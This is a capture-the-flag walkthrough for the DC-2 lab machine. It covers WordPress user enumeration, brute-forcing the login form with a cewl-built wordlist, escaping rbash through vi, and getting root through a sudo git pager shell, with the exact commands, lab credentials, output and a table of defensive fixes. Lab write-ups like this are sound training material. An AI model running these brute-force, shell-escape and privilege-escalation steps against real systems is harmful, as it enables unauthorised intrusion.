# Part A — The method (theory)

## A.1 The central idea: the wordlist must come **from the target**
Every beginner points `rockyou.txt` at a login form and waits. That file holds 14,344,392 real breached passwords,
ordered by observed frequency — the best generic list in existence — and here it **still fails in reasonable time**:
DC-2's passwords are ordinary words drawn from the **site's own themed content**, and those words are in no generic list.

> **This one idea — *the wordlist should come from the target* — is worth more than any tool in the path.** In a real
> engagement, a list built from product names, employees, the company's jargon and dates beats a generic list.

**`cewl`** (*Custom Word List*) crawls the target's pages and collects words — it does not "guess", it **reads**. The
author planted passwords in the site's text and left a signpost (flag 1) telling you to harvest them. That is the box.

## A.2 How WordPress leaks usernames for free
WordPress builds author archives from a **numeric ID**: `/?author=1` → 301 redirect → `/author/admin/`, `/?author=2` →
`/author/tom/`. Watch it by hand in a browser; `wpscan -e u` just loops the IDs and reads the redirect header. It is an
**oracle**: one unauthenticated request returns a valid username, and most defenders never read the log line it leaves.

wpscan also labels *how* it found each name. **Passive Detection** means the name came from data the site publishes
anyway (RSS bylines) — unnoticed. **Aggressive Detection** means it actively probed (author-ID brute force) — and that
**writes log entries**, so on a real engagement it is a decision, not a default. Either way you now hold **half** of
every credential pair: with usernames you can attack the login form *and* SSH, instead of guessing both halves.

## A.3 What `rbash` restricts — and why it is not a boundary
**`rbash`** (restricted bash) blocks: **`cd`**; any command **containing `/`** (so no `/bin/ls`); changing
`PATH`/`SHELL`/`ENV`; output redirection (`>`); and it keeps a **pinned `PATH`** holding a few permitted commands.

**The conceptual flaw:** `rbash` restricts **one process**. Anything that process can **spawn** is unrestricted — if `vi`
(or `python`, `less`, `find`…) is permitted, you can start a **new, unrestricted shell** from inside it, and that child
never heard any of the rules. So `rbash` is a **convenience, not a boundary**.

## A.4 `sudo -l` and GTFOBins: why "one command" is not a restriction
`sudo -l` shows what you may run as root. Read it as a **contract**:

```text
(root) NOPASSWD: /usr/bin/git
```
`(root)` → runs **as root** · `NOPASSWD:` → **no** password requested · `/usr/bin/git` → the one permitted program, at that exact path.

**The rule:** *any program that can shell out (`git`, `less`, `find -exec`, `tar`, `awk`, `zip`) is an escape hatch.*
The author thought they granted **one program**; they granted **whatever that program can be made to do** — that is what
[GTFOBins](https://gtfobins.github.io/) catalogues, tested per binary. Three `git` routes work on this box:

```text
sudo git help config                               # inherits from `less` → type  !/bin/sh
sudo git branch --help config                      # same pager — any subcommand that opens help works
sudo PAGER='/bin/sh -c "exec sh 0<&1"' git -p help # replace the pager outright
```
(That last one needs `sudo VAR=value …` — sudo **strips environment variables** by default; GTFOBins' own remark, not folklore.)

## A.5 Services on non-standard ports
SSH is on **7744**, not 22. That is **obscurity, not a control** — but it defeats a lazy scan. That is why you **always**
scan with `-p-` (all 65,535 ports), and never conclude "there is no SSH" from a default top-1,000 scan.

## A.6 The hostname the app expects
A web app can be configured for a **name** (`http://dc-2/`); on an isolated lab network nothing resolves it, so you
add it to **`/etc/hosts`**, the local translation table consulted **before** any DNS server. Until then, WordPress'
redirects point at a name nobody can resolve and parts of the site silently break — Hacking Articles' scan shows every
HTTP request **redirecting to `//dc-2`**. Read redirects; they are free configuration disclosure.

# Part C — The walkthrough, step by step

## Step 1 — Hostname, then scan
> **Why first.** The site **does not behave** until you give it the hostname it expects (`dc-2`) — every later web step
> depends on it (A.6). The scan comes second: you cannot plan an attack without knowing which services exist.

```bash
# Format: <IP-address> <hostname>. Replace TARGET with the target's real IP.
echo "TARGET dc-2" | sudo tee -a /etc/hosts
```
`echo` writes the line and `|` pipes it into `tee`, because a plain `>` would run as **you** while `/etc/hosts` is
root-owned; `tee -a` **appends** (`-a`) instead of overwriting your networking configuration.

```bash
sudo nmap -sC -sV -p- -T4 -oA scans/dc2 TARGET
```
| Flag | What it means here |
| --- | --- |
| `-sC` | run nmap's **default safe scripts** (titles, `robots.txt`, the generator tag…) |
| `-sV` | **fingerprint service versions** by comparing banners against ~10,000 known signatures |
| `-p-` | scan **all 65,535 TCP ports**, not just the default top 1,000 |
| `-T4` | fast lab timing — and never `-T5`, which abandons slow replies and **misses ports** |
| `sudo` | enables the faster SYN scan instead of a full connect scan |
| `-oA scans/dc2` | save `.nmap` + `.xml` + `.gnmap` at once, so you never re-scan just to grep something |

```text
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.7.10
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
```
**How to read it.** **Port 22 is not in the list.** `-p-` is what found **7744** — a default top-1,000 scan would have
missed it, and you would wrongly conclude "no SSH, web-only box". `http-generator: WordPress 4.7.10` hands you the CMS
**and** its exact version in one grep.

**Optional — content discovery.** You *may* brute-force directories here (`gobuster dir -u http://dc-2/ -w
/usr/share/wordlists/dirb/common.txt -x php`), but the site menu already exposes the interesting page, and mzfr
explicitly skips it: *"Instead of running any tool like gobuster let's just run `wpscan`"*. Brute-force a tree only
when you **cannot** see it — and note that moving a service off its standard port hid nothing from `-p-`.

## Step 2 — Flag 1 is an instruction
> **Why.** Before building any wordlist, read what the site itself tells you. Flag pages on beginner boxes are
> **signposts**, and this one names the tool to use.

```bash
curl -s http://dc-2/ | grep -oiE 'flag[^<]*|cewl[^<]*'
```
`curl -s` fetches the page **silently** and pipes the raw HTML to `grep`: `-o` prints **only the matched text**, `-i`
is case-insensitive, `-E` makes `|` mean *or*, and `[^<]*` grabs everything up to the next HTML tag.

```text
Flag 1: Your usual wordlists probably won't work, so instead, maybe you
just need to cewl more? ... (Hint: log in as one user, and if you can't get in, try another.)
```
**How to read it.** *"...just need to cewl more?"* names the tool (**CeWL**) in plain letters. The second half — *"log
in as one user, and if you can't get in, try another"* — is why `admin` stays uncracked later, and that is
**deliberate**: the box tells you in advance. mzfr and vshaliii both reach the page via the site's **Flag** menu.

## Step 3 — Enumerate users
> **Why.** A password attack needs the "who" before the "what" (A.2). This costs a handful of requests and zero exploits.

```bash
wpscan --url http://dc-2/ -e u
```
Use the **`dc-2` name, not the IP**, or you fight the redirects from A.6. `-e u` enumerates **u**sers (add `-e p` for
plugins — the common WordPress compromise vector — but this box does not need it).

```text
[+] admin   | Found By: Rss Generator (Passive Detection)
[+] tom     | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
[+] jerry   | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```
**How to read it.** `Author Id Brute Forcing` means wpscan requested `/?author=1`, `/?author=2`, … and read the redirect —
**the enumeration oracle** (A.2): three usernames for free, `admin` arriving **passively** from the RSS feed. Blue-team
lesson: block `/?author=` and strip the generator tag — both leak to a completely unauthenticated visitor.

## Step 4 — Build the list **from the target**, then attack the login form
> **Why.** Flag 1 told you generic lists fail here; this is the fix (A.1).

```bash
cewl -w dc2-passwords.txt -d 2 -m 5 http://dc-2/
wc -l dc2-passwords.txt
sort -u -o dc2-passwords.txt dc2-passwords.txt
wc -l dc2-passwords.txt
```
`-w` **w**rites the result to a file (otherwise cewl prints to the terminal); `-d 2` crawls **two hops** deep; `-m 5`
discards words **shorter than 5** characters. The two `wc -l` calls count lines **before and after** de-duplication, so
the effect is measured, not assumed.

```text
1214 dc2-passwords.txt
 887 dc2-passwords.txt
```
**How to read it.** **1,214 lines collapse to 887 unique** — duplicates buy nothing and cost login attempts, and every
attempt is a line in the target's log. **Trap:** `sort -u -o FILE FILE` writes back safely; `sort -u FILE > FILE`
**truncates the file before `sort` reads it** (the shell opens the output file first) and leaves you with an empty list.
The `-o` flag exists for that.

**There is no `john`/`hashcat` step on this box.** None of the cross-checked writeups ever see a password *hash* —
wpscan submits guesses **directly to the login form**, so there is nothing to crack offline.

```bash
wpscan --url http://dc-2/ -U tom,jerry,admin -P dc2-passwords.txt
```
`-U` is the **u**sername list (comma-separated, no spaces), `-P` the **p**assword file. Older wpscan v2.x used `-w` for the
password file — vshaliii's writeup shows exactly that — so if a tutorial's `-w` is rejected by your version, that is why.

```text
[SUCCESS] - tom / parturient
[SUCCESS] - jerry / adipiscing
[!] admin - No valid passwords found
```
**How to read it.** Two of three accounts fell to an 887-word list **built from the site's own text** — `rockyou.txt`
would not have found `parturient` in reasonable time. `admin` failing is **not** a dead end: flag 1 already said "if you
can't get in, try another". vshaliii's equivalent run made **1,530 requests** in a minute — a scream in `auth.log`.

## Step 5 — Flag 2: log in to the dashboard, then change entry point
> **Why.** Flag 2 is the only one you have not collected, and it tells you where the real door is — skipping it is how
> people waste an hour trying to hack WordPress.

Browse to `http://dc-2/wp-login.php`, log in as **jerry / adipiscing** (the pair you just proved), then open the
**Flag** menu item:
```text
Flag 2: If you're lucky enough to find us, we're not in the habit of giving
out hints. Oh, wait, we are! You don't need to exploit WordPress to get in.
There is a better way ... (a service on another port)
```
**How to read it.** The author closes a door on purpose: do **not** chase RCE inside the CMS — mzfr looked for the
theme-editor route to a reverse shell and found no editable templates. Flag 2 points at **the other port** from Step 1:
SSH on **7744**. And note the quiet lesson: anything the app stores in its pages is readable by whoever logs in.

## Step 6 — SSH on the odd port, into a restricted shell
> **Why.** Flag 2 said "a service on another port"; only 7744 fits the scan. Try **both** pairs — mzfr reports `jerry`
> is **rejected** over SSH while `tom` works, so do not stop at the first "permission denied".

```bash
ssh tom@TARGET -p 7744
# password: parturient
```
`-p 7744` is SSH's port flag (**lowercase**). Without it you talk to port 22, get "Connection refused", and conclude the box
has no SSH — the classic misreading here. Inside, the shell fights back:

```text
tom@DC-2:~$ cd /tmp
-rbash: cd: restricted
tom@DC-2:~$ /bin/ls
-rbash: /bin/ls: restricted
tom@DC-2:~$ whoami
-rbash: whoami: command not found
```
**How to read it.** Three failures, three different rules (A.3): `cd` is banned **by name**; `/bin/ls` is banned **because
it contains `/`**; `whoami` is "not found" because the **`PATH` is pinned** — the binary exists, this shell cannot see
it. Confusing that with "the program is missing" is the classic misread here. **Confirm** rather than guess:

```bash
echo $0; set -o | grep restricted; echo $PATH
```
```text
-rbash
restricted        on
/home/tom/usr/bin
```
`$0` = `-rbash` — the leading `-` is the sign of a **restricted login shell**; `restricted on` says the same in `set`'s
words; `/home/tom/usr/bin` is the **pinned PATH**. Explore it: Hacking Articles found only a handful of permitted
programs there, `cat` **not** among them — so you cannot even read `flag3.txt` from inside `rbash`. That listing is your menu.

## Step 7 — Escape `rbash` (flag 3)
> **Why.** Every failure in Step 6 points at one idea: the restriction lives in **this one shell process** (A.3). `vi` is
> permitted — so use `vi` to start a *new* shell that was never restricted.

```bash
vi
:set shell=/bin/bash    # tell vi which program to launch (mzfr uses /bin/sh — any unrestricted shell works)
:shell                  # launch it — you are now in a fresh, unrestricted bash, child of vi
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export SHELL=/bin/bash
id
cat flag3.txt
```
Lines starting with `:` are vi's **ex-command mode** (press `Esc` first if you started inserting text). The two `export`
lines are **essential — and the step tutorials bury**: your new shell *inherited* the crippled pinned `PATH`, so `ls`,
`id` and `sudo` still report `command not found` — which **looks** like a failed escape. Overwrite `PATH`; then `id`:

```text
uid=1001(tom) gid=1001(tom) groups=1001(tom)
Flag 3: Poor old Tom is always running after Jerry. Perhaps he should
su for all the stress he causes.
```
**How to read it.** Flag 3 is a **pun that is also an instruction**: Tom chases Jerry, and you should `su` — switch user —
to **jerry**, whose password (`adipiscing`) you already own from Step 4.

**Two cheaper escapes, in order:** `bash --noprofile --norc` (if the restriction comes from `~/.bashrc`, this one line
defeats it), and `vim -c ':!sh'` (the lab walkthrough also lists `less`, `man`, `find -exec` variants).

**Trap.** If `:shell` seems to do nothing, check you pressed `Enter` **after** `:set shell=/bin/bash` — a comment on the
Hacking Articles walkthrough is precisely that mistake: *setting* a value changes a setting; `:shell` starts it.

## Step 8 — Pivot to another user with `su` (flag 4)

```bash
su jerry
# password: adipiscing   — jerry's own password, cracked from WordPress in Step 4
whoami; id
cat /home/jerry/flag4.txt
```
`su` prompts for **jerry's** password, not yours; `whoami`/`id` confirm the pivot before you celebrate. It also needs a
**real TTY**, which is why the `rbash` escape had to come first — without a terminal it fails with `su: must be run from a terminal`.

```text
jerry
uid=1000(jerry) gid=1000(jerry) groups=1000(jerry),100(users)
Flag 4: Good to see that you've made it this far, but can you make it
to the very end? ... hint: git
```
**How to read it.** Flag 4 is a **hint**, not a prize: "git" names the program to abuse in Step 9. What actually got you
here is **credential reuse across services** — jerry's WordPress password also works for his Linux account — **not** a
shared password between Tom and Jerry (`tom: parturient` is a different string entirely).

## Step 9 — `sudo -l` and the GTFOBins escape (flag 5)
> **Why.** `sudo -l` is the single highest-value command you can run as any new user — it costs nothing, and a surprising
> fraction of machines die on one line of its output (A.4).

```bash
sudo -l
```
```text
User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
```
`(root)` = as root · `NOPASSWD:` = no password · `/usr/bin/git` = the one permitted program. `secure_path` is present on this
box, so **PATH hijacking is unavailable** — the escape must come **through `git` itself**.

```bash
sudo git -p help config
# inside the pager (less), type:
!/bin/sh
id
cat /root/flag5.txt     # or run `ls /root/` first — see the verification note in Part G
```
```text
# id
uid=0(root) gid=0(root) groups=0(root)
```
**What it does.** `-p` forces git to show its help through a **pager** (`less`). GTFOBins documents this as *inherit*:
`less` accepts `!CMD`, which runs CMD via a shell — and because the chain was started by root-owned `git` under `NOPASSWD`,
**that shell is root**. The `#` prompt is your first clue; your last command prints `... you've got root ...
congratulations!`.

**Alternative routes, all documented:** `sudo git help add` → `!/bin/bash` (Hacking Articles' exact route);
`sudo git branch --help config` → `!/bin/sh`; `sudo PAGER='/bin/sh -c "exec sh 0<&1"' git -p help`; and GTFOBins'
git-hook / `--exec-path` payloads, which need a writable directory — the pager route needs none.

# Part D — Defensive lessons

| Finding | Fix |
| --- | --- |
| WordPress user enumeration (`?author=`) | Block `/?author=` at the WAF or via rewrite rule — it leaks the user list for free |
| Site content used as a password source | Passwords must not be derivable from public content; enforce length + a breached-password check |
| WordPress password reused for SSH | Unique credentials per service; consider disabling SSH password auth (keys only) |
| `jerry`'s WordPress password also valid for his OS account (`su`) | One account, one unique password per service; detect credential reuse across systems |
| **`rbash` as a security boundary** | Do not rely on it. Use `sudo` with explicit commands, or a service account with **no shell** (`/usr/sbin/nologin`) |
| SSH on a non-standard port | Obscurity, not a control. Key-based auth + `fail2ban` + no password auth |
| `(root) NOPASSWD: /usr/bin/git` | Never grant `NOPASSWD` on a general-purpose tool. Grant the *specific* subcommand or a purpose-built script |
| WordPress 4.7.10 / Apache 2.4.10 left unpatched | Update — wpscan flags an authenticated arbitrary-file-deletion bug fixed in 4.7.11; the version *is* the vulnerability |

**The single biggest lesson:** *a restricted shell is a convenience, not a boundary* — it restricts one process; anything it spawns is unrestricted.

  - **Consensus chain:** add `dc-2` to `/etc/hosts` → flag1 "cewl" hint → `wpscan -e u` (admin, tom, jerry) → `cewl` list → `wpscan` brute → `tom:parturient` / `jerry:adipiscing` → log in to the dashboard (flag 2) → SSH 7744 as `tom` → `rbash` escape via `vi` → `su jerry` → `sudo -l` → git pager → root.
  - **Common pitfall:** scan with `-p-`; a default top-1000 scan never sees SSH on 7744 and people wrongly conclude there is no SSH.
  - **Common pitfall:** right after the `vi` escape every command is "not found" — fix `PATH` (and `SHELL`); `su` also needs a real TTY, so escape `rbash` first.
  - **Common pitfall:** credential **reuse between the CMS and the OS** is the point of the box — `su jerry` works because `adipiscing` is *jerry's own* password in both systems; Tom and Jerry do **not** share a password with each other (`tom: parturient` is a different string).
  - **Alternative route:** any `git` pager escape works — `sudo git -p help config` → `!/bin/sh` or `sudo git help add` → `!/bin/bash`; GTFOBins also lists `sudo PAGER='/bin/sh -c "exec sh 0<&1"' git -p help`, `sudo git branch --help config`, and git-hook / `--exec-path` payloads.
  - **⚠️ Verification note (final flag filename):** this card and the repo's own lab walkthrough show the proof file as `/root/flag5.txt`, while **Hacking Articles** and **vshaliii** both show `/root/final-flag.txt`; the lab README explicitly warns that file contents "can differ slightly between builds". The table value is kept — run `ls /root/` when you get there.
  - **⚠️ Verification note (who owns the sudo rule):** Hacking Articles' *prose* attributes the `(root) NOPASSWD: /usr/bin/git` rule to `tom`, but mzfr and vshaliii both run `sudo -l` as **jerry**, and the repo's lab writeup prints `User jerry may run the following commands on DC-2:`. The card keeps `jerry` — also the only order the chain allows, since `sudo -l` is reached *after* `su jerry`.
  - **⚠️ Verification note (`vim` is not SUID here):** none of the fetched writeups show a SUID bit on `vim` — the Step 7 escape works simply because `vi` is one of the few commands left in tom's pinned `PATH`. If your build *does* ship a SUID `vim`, the GTFOBins `vim` payload (`sudo vim -c ':!sh'`) escalates directly.
  - **⚠️ Verification note (WordPress version):** the metadata table keeps **4.7.10** (vshaliii's wpscan reports "WordPress version 4.7.10 (Released on 2018-04-03)"), while the repo lab walkthrough's sample nmap output shows 4.7.3 — both fit their own build, and the README says details vary by build. Re-run your own enumeration to learn your build's truth.
